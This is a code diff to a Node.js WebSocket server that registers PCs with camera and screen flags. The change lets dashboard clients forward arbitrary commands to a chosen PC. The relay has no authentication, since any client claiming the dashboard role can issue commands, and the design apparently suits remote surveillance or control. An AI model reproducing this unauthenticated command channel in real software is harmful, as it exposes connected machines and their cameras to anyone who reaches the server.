@@ -23,6 +23,7 @@ const wss = new WebSocketServer({ server: httpServer });
 
 // pcId -> { hasCamera, lastSeen }
 const pcs = new Map();
+const pcSockets = new Map(); // pcId -> ws
 const dashboards = new Set();
 
 wss.on('connection', (ws, req) => {
@@ -31,8 +32,17 @@ wss.on('connection', (ws, req) => {
     // Dashboard browser client
     if (url.searchParams.get('role') === 'dashboard') {
         dashboards.add(ws);
-        // Send current PC list on connect
         ws.send(JSON.stringify({ type: 'pc_list', pcs: [...pcs.entries()].map(([id, v]) => ({ id, ...v })) }));
+        ws.on('message', (data) => {
+            try {
+                const msg = JSON.parse(data);
+                // forward commands to target PC
+                if (msg.type === 'command' && msg.target) {
+                    const target = pcSockets.get(msg.target);
+                    if (target && target.readyState === 1) target.send(JSON.stringify({ type: msg.cmd }));
+                }
+            } catch (e) {}
+        });
         ws.on('close', () => dashboards.delete(ws));
         return;
     }
@@ -47,6 +57,7 @@ wss.on('connection', (ws, req) => {
             if (msg.type === 'hello') {
                 pcId = msg.id;
                 pcs.set(pcId, { hasCamera: msg.hasCamera, hasScreen: msg.hasScreen || false, lastSeen: Date.now() });
+                pcSockets.set(pcId, ws);
                 broadcast(dashboards, { type: 'pc_connected', id: pcId, hasCamera: msg.hasCamera, hasScreen: msg.hasScreen || false });
                 console.log(`[+] PC connected: ${pcId} | camera: ${msg.hasCamera} | screen: ${msg.hasScreen}`);
             }
@@ -69,6 +80,7 @@ wss.on('connection', (ws, req) => {
     ws.on('close', () => {
         if (pcId) {
             pcs.delete(pcId);
+            pcSockets.delete(pcId);
             broadcast(dashboards, { type: 'pc_disconnected', id: pcId });
             console.log(`[-] PC disconnected: ${pcId}`);
         }
